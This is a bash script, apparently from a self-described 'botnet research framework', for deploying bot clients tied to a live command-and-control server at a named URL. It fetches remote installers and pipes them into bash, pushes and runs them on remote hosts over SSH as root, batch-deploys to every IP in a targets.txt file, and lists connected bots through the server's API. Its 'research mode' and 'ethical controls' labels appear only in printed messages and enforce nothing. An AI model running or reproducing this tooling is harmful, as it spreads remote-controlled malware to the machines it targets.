#!/bin/bash
# Deploy Bot Clients to Live C2 Server
# Advanced Botnet Research Framework

# Configuration
C2_SERVER="https://botnet-xdio.onrender.com"
RESEARCH_MODE="true"
SESSION_ID="research_live_$(date +%Y%m%d_%H%M%S)"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}🔬 Advanced Botnet Research Framework${NC}"
echo -e "${BLUE}📡 C2 Server: $C2_SERVER${NC}"
echo -e "${YELLOW}⚖️  Research Mode: ENABLED${NC}"
echo -e "${GREEN}🆔 Session ID: $SESSION_ID${NC}"
echo ""

# Function to log with timestamp
log() {
    echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1"
}

# Check server availability
log "🔍 Checking C2 server availability..."
if curl -s "$C2_SERVER/health" > /dev/null; then
    log "✅ C2 server is online and responding"
else
    echo -e "${RED}❌ Error: C2 server is not accessible at $C2_SERVER${NC}"
    echo -e "${YELLOW}Please check the server URL and try again.${NC}"
    exit 1
fi

# Deploy clients based on command line options
case "${1:-help}" in
    "windows")
        log "🪟 Deploying Windows client..."
        echo "📥 Download command:"
        echo "curl -L $C2_SERVER/download/client-windows.exe -o bot-client.bat"
        echo ""
        echo "🚀 Run command:"
        echo "./bot-client.bat"
        ;;
        
    "linux")
        log "🐧 Deploying Linux client..."
        echo "📥 Download command:"
        echo "curl -L $C2_SERVER/download/client-linux -o bot-client"
        echo ""
        echo "🚀 Run commands:"
        echo "chmod +x bot-client"
        echo "./bot-client"
        ;;
        
    "macos")
        log "🍎 Deploying macOS client..."
        echo "📥 Download command:"
        echo "curl -L $C2_SERVER/download/client-macos -o bot-client"
        echo ""
        echo "🚀 Run commands:"
        echo "chmod +x bot-client"
        echo "./bot-client"
        ;;
        
    "auto")
        log "🤖 Auto-deploying for current platform..."
        curl -s "$C2_SERVER/install" | bash
        ;;
        
    "local")
        log "📍 Deploying client on local machine..."
        
        # Detect platform
        if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
            PLATFORM="windows"
            EXT=".bat"
        elif [[ "$OSTYPE" == "darwin"* ]]; then
            PLATFORM="macos"
            EXT=""
        else
            PLATFORM="linux"
            EXT=""
        fi
        
        log "🔍 Detected platform: $PLATFORM"
        log "📥 Downloading client..."
        
        curl -L "$C2_SERVER/download/client-$PLATFORM$EXT" -o "bot-client$EXT"
        
        if [[ $? -eq 0 ]]; then
            chmod +x "bot-client$EXT"
            log "✅ Client downloaded successfully!"
            log "🚀 Starting client..."
            echo ""
            echo -e "${YELLOW}Client will connect to: $C2_SERVER${NC}"
            echo -e "${YELLOW}Research Mode: ENABLED${NC}"
            echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
            echo ""
            ./bot-client$EXT
        else
            echo -e "${RED}❌ Failed to download client${NC}"
            exit 1
        fi
        ;;
        
    "remote")
        if [[ -z "$2" ]]; then
            echo -e "${RED}❌ Error: Please provide target IP address${NC}"
            echo "Usage: $0 remote <ip_address> [username]"
            exit 1
        fi
        
        TARGET_IP="$2"
        USERNAME="${3:-root}"
        
        log "📡 Deploying to remote machine: $USERNAME@$TARGET_IP"
        
        # Create remote deployment script
        cat > /tmp/remote_deploy.sh << EOF
#!/bin/bash
echo "🔬 Advanced Botnet Research Framework - Remote Deployment"
echo "📡 C2 Server: $C2_SERVER"
echo "⚖️  Research Mode: ENABLED"
echo ""

# Download and run client
curl -s "$C2_SERVER/install" | bash
EOF
        
        # Copy and execute on remote machine
        scp /tmp/remote_deploy.sh $USERNAME@$TARGET_IP:/tmp/
        ssh $USERNAME@$TARGET_IP "chmod +x /tmp/remote_deploy.sh && /tmp/remote_deploy.sh"
        
        rm /tmp/remote_deploy.sh
        log "✅ Remote deployment completed"
        ;;
        
    "batch")
        if [[ ! -f "targets.txt" ]]; then
            echo -e "${RED}❌ Error: targets.txt file not found${NC}"
            echo "Create targets.txt with one IP address per line"
            exit 1
        fi
        
        log "📋 Batch deployment starting..."
        
        while IFS= read -r target; do
            [[ -z "$target" || "$target" =~ ^# ]] && continue
            
            log "📡 Deploying to: $target"
            
            # Deploy to each target
            ssh root@$target "curl -s '$C2_SERVER/install' | bash" &
            
        done < targets.txt
        
        wait
        log "✅ Batch deployment completed"
        ;;
        
    "status")
        log "📊 Checking deployment status..."
        
        # Check server status
        echo "🖥️  Server Status:"
        curl -s "$C2_SERVER/api/status" | python3 -m json.tool 2>/dev/null || echo "Unable to parse status"
        echo ""
        
        # Check connected bots
        echo "🤖 Connected Bots:"
        curl -s "$C2_SERVER/api/bots" | python3 -m json.tool 2>/dev/null || echo "No bots connected"
        echo ""
        
        # Check recent activity
        echo "📋 Recent Activity:"
        curl -s "$C2_SERVER/api/activity/recent" | python3 -m json.tool 2>/dev/null || echo "No recent activity"
        ;;
        
    "stop")
        log "🛑 Sending stop signal to all clients..."
        curl -X POST "$C2_SERVER/api/emergency-stop" 2>/dev/null
        log "✅ Stop signal sent"
        ;;
        
    "help"|*)
        echo -e "${BLUE}🔬 Advanced Botnet Research Framework - Client Deployment${NC}"
        echo ""
        echo "Usage: $0 [COMMAND] [OPTIONS]"
        echo ""
        echo "Commands:"
        echo "  windows              Download Windows client (.bat)"
        echo "  linux                Download Linux client"
        echo "  macos                Download macOS client"
        echo "  auto                 Auto-detect and install client"
        echo "  local                Deploy client on local machine"
        echo "  remote <ip> [user]   Deploy to remote machine via SSH"
        echo "  batch                Deploy to multiple IPs from targets.txt"
        echo "  status               Check server and bot status"
        echo "  stop                 Emergency stop all clients"
        echo "  help                 Show this help message"
        echo ""
        echo "Examples:"
        echo "  $0 local                           # Deploy on current machine"
        echo "  $0 remote 192.168.1.100 admin     # Deploy to remote machine"
        echo "  $0 batch                           # Deploy to all IPs in targets.txt"
        echo "  $0 status                          # Check deployment status"
        echo ""
        echo -e "${YELLOW}⚖️  All deployments are in RESEARCH MODE with ethical controls${NC}"
        echo -e "${BLUE}📡 Live C2 Server: $C2_SERVER${NC}"
        ;;
esac
